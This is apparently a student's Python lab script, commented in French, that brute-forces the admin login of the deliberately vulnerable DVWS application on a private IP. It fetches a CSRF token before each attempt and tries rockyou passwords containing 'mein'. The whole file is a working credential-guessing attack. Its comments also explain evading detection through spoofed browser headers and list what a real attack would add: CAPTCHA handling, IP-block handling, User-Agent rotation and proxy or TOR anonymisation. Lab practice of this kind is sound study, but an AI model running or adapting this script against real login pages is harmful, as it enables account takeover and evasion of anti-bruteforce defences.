"""
Script de brute force utilisant BeautifulSoup et la wordlist rockyou 
pour trouver le mot de passe de l'utilisateur admin sur DVWS
Filtre spécifiquement les mots de passe contenant "mein"
"""

# === IMPORTS ===
import requests  # Pour envoyer des requêtes HTTP (GET, POST)
import time      # Pour ajouter des délais entre les tentatives
from bs4 import BeautifulSoup  # Pour parser le HTML et extraire des données

# === CONFIGURATION ===
TARGET_URL = "http://10.0.1.10:5780/website/login.php"  # URL de la page de connexion de Damn Vulnerable Web Server (DVWS)
USERNAME = "admin"  # Nom d'utilisateur par défaut (on sait que c'est "admin")
DELAY = 0.01  # Délai en secondes entre chaque tentative (pour éviter la surcharge du serveur)
ROCKYOU_FILE = "rockyou.txt"  # Fichier contenant la wordlist de mots de passe (on sit que le mdp est dans le fichier rockyou.txt)



"""
⚠️ Limitations dans un vrai cas :
1. Délai trop court :
❌ Détectable : Les serveurs bloquent les attaques trop rapides
❌ Recommandé : 1-5 secondes entre tentatives
2. Pas de gestion des blocages :
❌ Manque : Détection des captchas
❌ Manque : Gestion des IP bloquées
❌ Manque : Rotation des User-Agents
3. Pas de proxy/TOR :
❌ Traçable : L'IP d'attaque est visible
❌ Risqué : Pas d'anonymisation
"""


def get_csrf_token(session):
    """
    Récupère le token CSRF (Cross-Site Request Forgery) de la page de connexion.
    
    POURQUOI CETTE FONCTION EST NÉCESSAIRE :
    - Le serveur DVWS exige un token CSRF valide pour chaque requête POST
    - Sans ce token, toutes les tentatives de connexion échouent immédiatement
    - Le token change à chaque session, donc on doit le récupérer à chaque tentative
    
    COMMENT ÇA MARCHE :
    1. On fait une requête GET vers la page de connexion
    2. On parse le HTML avec BeautifulSoup pour extraire le token
    3. On retourne la valeur du token pour l'utiliser dans la requête POST
    """
    
    try:
        # === ÉTAPE 1 : Récupérer la page de connexion ===
        # On fait une requête GET vers la page de login pour obtenir le formulaire HTML
        response = session.get(TARGET_URL, timeout=10)
        
        # Vérifier que la requête a réussi (code 200 = OK)
        if response.status_code == 200:
            # === ÉTAPE 2 : Parser le HTML avec BeautifulSoup ===
            # BeautifulSoup transforme le HTML en un arbre d'objets Python navigable
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # === ÉTAPE 3 : Chercher l'input contenant le token CSRF ===
            # On cherche un élément <input> avec l'attribut name="user_token"
            # C'est là que le serveur cache le token CSRF dans le formulaire
            token_input = soup.find('input', {'name': 'user_token'})
            
            # === ÉTAPE 4 : Extraire la valeur du token ===
            # Si on trouve l'input et qu'il a une valeur, on la retourne
            if token_input and token_input.get('value'):
                return token_input.get('value')
            else:
                raise ValueError("Token CSRF non trouvé dans la page")
        else:
            raise RuntimeError(f"Erreur lors de la requête: code {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        # En cas d'erreur réseau, on lève une exception avec plus de détails
        raise RuntimeError(f"Erreur de connexion au serveur: {str(e)}")



def test_login(username, password, session):
    """
    Teste une combinaison nom d'utilisateur/mot de passe.
    
    POURQUOI CETTE FONCTION EST CRUCIALE :
    - C'est le cœur de l'attaque par brute force
    - Elle simule une tentative de connexion légitime
    - Elle analyse la réponse pour déterminer si le mot de passe est correct
    
    COMMENT ÇA MARCHE :
    1. Récupérer un token CSRF valide
    2. Préparer les headers pour ressembler à un navigateur
    3. Envoyer la requête POST avec les identifiants
    4. Analyser la réponse pour détecter succès/échec
    """
    
    # === ÉTAPE 1 : Récupérer le token CSRF ===
    # On doit récupérer un token CSRF pour chaque tentative
    csrf_token = get_csrf_token(session)
    
    # === ÉTAPE 2 : Préparer les headers pour simuler un navigateur ===
    # Les headers sont nécessaires car:
    # 1. Certains sites bloquent les requêtes qui ne viennent pas de navigateurs
    # 2. Ils permettent d'éviter la détection de bots/scripts automatisés
    # 3. Ils aident à contourner les protections anti-bruteforce basiques
    # 4. Ils simulent un comportement humain normal pour ne pas être bloqué
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'fr-FR,fr;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',  # Format des données du formulaire
        'Referer': TARGET_URL  # Page d'où vient la requête (pour la sécurité)
    }
    
    # === ÉTAPE 3 : Préparer les données du formulaire ===
    # Ces données correspondent exactement aux champs du formulaire HTML
    data = {
        'username': username,        # Nom d'utilisateur à tester
        'password': password,        # Mot de passe à tester
        'user_token': csrf_token,   # Token CSRF (OBLIGATOIRE!)
        'Login': 'Login'            # Bouton de soumission du formulaire
    }
    
    try:
        # === ÉTAPE 4 : Envoyer la requête POST ===
        # C'est ici qu'on teste réellement la combinaison username/password
        response = session.post(TARGET_URL, data=data, headers=headers, timeout=10)
        
        # === ÉTAPE 5 : Analyser la réponse ===
        if response.status_code == 200:
            # Parser la réponse HTML pour extraire les informations
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # === DÉTECTION DES MESSAGES D'ERREUR ===
            # On cherche des messages d'erreur spécifiques dans la page
            error_message = soup.find('div', class_='message')
            if error_message:
                error_text = error_message.get_text().strip()
                
                # Différents types d'erreurs possibles sur cette page
                if "Bad password" in error_text:
                    return False, "Mauvais mot de passe"
                elif "Login failed" in error_text:
                    return False, "Échec de connexion"
               
            
            # === DÉTECTION DES INDICATEURS DE SUCCÈS ===
            # On cherche des mots-clés qui indiquent une connexion réussie
            if any(indicator in response.text.lower() for indicator in [
                "welcome", "dashboard", "logout", "admin panel", "home",
                "success", "logged in", "authentication successful"
            ]):
                return True, "Connexion réussie!"
            
            # === DÉTECTION DE REDIRECTION ===
            # Si on est redirigé vers une autre page, c'est souvent un signe de succès
            elif response.url != TARGET_URL:
                return True, "Connexion réussie (redirection détectée)!"
            
            # === CAS AMBIGU ===
            # Si aucun message clair, on considère que c'est un échec
            else:
                return False, "Échec silencieux (aucun message d'erreur/succès)"
        else:
            # Erreur HTTP (404, 500, etc.)
            return False, f"Erreur HTTP: {response.status_code}"
            
    except requests.exceptions.RequestException as e:
        # Erreur réseau (timeout, connexion refusée, etc.)
        return False, f"Erreur de connexion: {str(e)}"



def load_rockyou_passwords_with_mein(filename):
    """
    Charge les mots de passe depuis la wordlist rockyou en filtrant ceux contenant "mein".
    
    POURQUOI CETTE FONCTION EST IMPORTANTE :
    - Rockyou.txt contient 14 millions de mots de passe réels
    - Le filtre "mein" réduit drastiquement le nombre de tests (indice dans le sujet)
    
    COMMENT ÇA MARCHE :
    1. Ouvrir le fichier rockyou.txt
    2. Lire chaque ligne (un mot de passe par ligne)
    3. Filtrer seulement ceux contenant "mein"
    4. Retourner la liste filtrée
    """
    passwords = []  # Liste pour stocker les mots de passe filtrés
    
    try:
        # === ÉTAPE 1 : Ouvrir le fichier rockyou.txt ===
        # 'utf-8' : encodage pour supporter les caractères spéciaux
        # 'errors='ignore'' : ignorer les caractères non décodables
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            
            # === ÉTAPE 2 : Lire chaque ligne du fichier ===
            for line in f:
                # Nettoyer la ligne (enlever espaces, retours à la ligne)
                password = line.strip()
                
                # === ÉTAPE 3 : Appliquer le filtre "mein" ===
                if "mein" in password.lower():
                    passwords.append(password)
        
        # Afficher le nombre de mots de passe trouvés
        print(f"📚 {len(passwords)} mots de passe contenant 'mein' trouvés dans {filename}")
        return passwords
        
    except FileNotFoundError:
        # Le fichier rockyou.txt non trouve
        print(f"❌ Fichier {filename} non trouvé")
        return []
    except Exception as e:
        # Autre erreur (permissions, corruption, etc.)
        print(f"❌ Erreur lors du chargement de {filename}: {str(e)}")
        return []

        

def main():
    """
    Fonction principale qui orchestre l'attaque par force brute.

    COMMENT ÇA MARCHE :
    1. Afficher les informations de l'attaque
    2. Charger les mots de passe filtrés
    3. Créer une session HTTP persistante
    4. Tester chaque mot de passe un par un
    5. Afficher les résultats finaux
    """
    
    # === ÉTAPE 1 : Afficher les informations de l'attaque ===
    print(f"🔍 Recherche du mot de passe pour l'utilisateur '{USERNAME}'")
    print(f"🎯 Cible: {TARGET_URL}")
    print(f"📚 Utilisation de la wordlist: {ROCKYOU_FILE}")
    print(f"🔍 Filtre: mots de passe contenant 'mein'")
    print(f"🔐 Gestion du token CSRF avec BeautifulSoup")
    print("=" * 60)
    
    # === ÉTAPE 2 : Charger les mots de passe filtrés ===
    # On charge seulement les mots de passe contenant "mein" pour optimiser l'attaque
    passwords = load_rockyou_passwords_with_mein(ROCKYOU_FILE)
    
    # Vérifier qu'on a trouvé des mots de passe à tester
    if not passwords:
        print("❌ Aucun mot de passe contenant 'mein' trouvé. Arrêt du script.")
        return
    
    # === ÉTAPE 3 : Afficher un aperçu des mots de passe à tester ===
    print(f"📝 Mots de passe à tester: {len(passwords)}")

    
    # === ÉTAPE 4 : Créer une session HTTP persistante ===
    # Une session permet de maintenir les cookies et la connexion
    # C'est plus efficace que de créer une nouvelle connexion à chaque requête
    session = requests.Session()
    
    # Liste pour stocker les mots de passe qui fonctionnent
    successful_passwords = []
    
    # === ÉTAPE 5 : Boucle principale de l'attaque ===
    # On teste chaque mot de passe un par un
    for i, password in enumerate(passwords, 1):
        # Afficher le progrès de l'attaque
        width = len(str(len(passwords)))
        space = max(len(password) for password in passwords)
        print(f"[{i:{width}d}/{len(passwords)}] Test: {password:<{space}}", end=" ")
        
        # === TESTER LA COMBINAISON USERNAME/PASSWORD ===
        # C'est ici qu'on appelle la fonction test_login pour chaque tentative
        success, message = test_login(USERNAME, password, session)
        
        # === ANALYSER LE RÉSULTAT ===
        if success:
            # SUCCÈS : On a trouvé le bon mot de passe !
            print(f"✅ {message}")
            successful_passwords.append(password)
            print(f"\n🎉 MOT DE PASSE TROUVÉ: '{password}'")
            break  # Arrêter l'attaque dès qu'on trouve le bon mot de passe
        else:
            # ÉCHEC : Afficher le message d'erreur et continuer
            print(f"❌ {message}")
        
        # === DÉLAI ENTRE LES TENTATIVES ===
        # Important pour éviter de surcharger le serveur et d'être détecté
        if i < len(passwords):
            time.sleep(DELAY)
    
    # === ÉTAPE 6 : Afficher les résultats finaux ===
    print("\n" + "=" * 60)
    if successful_passwords:
        print(f"✅ Mot(s) de passe trouvé(s): {', '.join(successful_passwords)}")
    else:
        print("❌ Aucun mot de passe trouvé parmi ceux contenant 'mein'")
        print(f"💡 {len(passwords)} mots de passe testés")

# === POINT D'ENTRÉE DU SCRIPT ===
# Cette condition vérifie si le script est exécuté directement (pas importé)
# C'est une bonne pratique Python pour les scripts exécutables
if __name__ == "__main__":
    main()  # Lancer la fonction principale
